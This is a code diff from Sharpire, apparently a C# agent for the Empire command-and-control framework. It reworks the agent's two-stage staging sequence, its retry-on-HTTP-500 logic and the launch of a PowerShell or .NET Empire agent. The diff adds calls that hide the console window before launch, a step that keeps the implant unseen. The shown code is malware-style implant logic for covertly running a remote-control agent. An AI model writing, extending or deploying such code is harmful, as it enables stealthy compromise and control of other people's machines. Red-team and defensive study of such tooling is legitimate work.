@@ -60,60 +60,58 @@ namespace Sharpire
                 {
                     return true;
                 }
-           );
+            );
 
             try
             {
+                stage1response = stage1();
+                Console.WriteLine("Stage1 Complete");
                 try
                 {
-                    stage1response = stage1();
-                    Console.WriteLine("Stage1 Complete");
+                    stage2response = stage2(stage1response);
+                    Console.WriteLine("Stage2 Complete");
                     try
                     {
-                        stage2response = stage2(stage1response);
-                        Console.WriteLine("Stage2 Complete");
-                        try
+                        Console.WriteLine("Launching Empire");
+                        IntPtr handle = Misc.GetConsoleWindow();
+                        Misc.ShowWindow(handle, Misc.SW_HIDE);
+                        if (language == "powershell" || language == "ps" || language == "posh")
                         {
-                            Console.WriteLine("Launching Empire");
-                            if (language == "powershell" || language == "ps" || language == "posh")
-                            {
-                                powershellEmpire(stage2response);
-                            }
-                            else if (language == "dotnet" || language == "net" || language == "clr")
-                            {
-                                dotNetEmpire();
-                            }
+                            powershellEmpire(stage2response);
                         }
-                        catch
+                        else if (language == "dotnet" || language == "net" || language == "clr")
                         {
-                            Console.WriteLine("Empire Failure");
-                            throw;
+                            dotNetEmpire();
                         }
                     }
                     catch
                     {
-                        Console.WriteLine("Stage2 Failure");
+                        Console.WriteLine("Empire Failure");
                         throw;
                     }
                 }
-                catch (Exception exception)
+                catch
                 {
-                    Console.WriteLine("Stage1 Failure");
+                    Console.WriteLine("Stage2 Failure");
                     throw;
                 }
-
             }
             catch (WebException webError)
             {
                 if ((Int32)((HttpWebResponse)webError.Response).StatusCode == 500)
                 {
+                    Console.WriteLine("Stage1 Failure");
                     GC.Collect();
                     execute();
+                }
+                else
+                {
+                    throw;
                 }
             }
             catch (Exception error)
             {
-                Console.WriteLine("Execution Failed");
+                Console.WriteLine("Stage1 Failure");
                 Console.WriteLine(error.ToString());
             }
             finally
